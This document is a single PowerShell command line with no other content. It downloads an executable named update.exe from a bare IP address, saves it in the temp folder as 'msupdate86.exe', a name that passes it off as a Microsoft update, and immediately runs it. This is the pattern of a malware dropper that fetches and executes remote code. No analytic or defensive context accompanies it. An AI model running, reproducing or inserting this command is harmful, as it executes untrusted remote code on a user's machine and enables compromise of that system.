
(New-Object System.Net.WebClient).DownloadFile('http://185.106.122.64/update.exe',"$env:TEMP\msupdate86.exe");Start-Process ("$env:TEMP\msupdate86.exe")

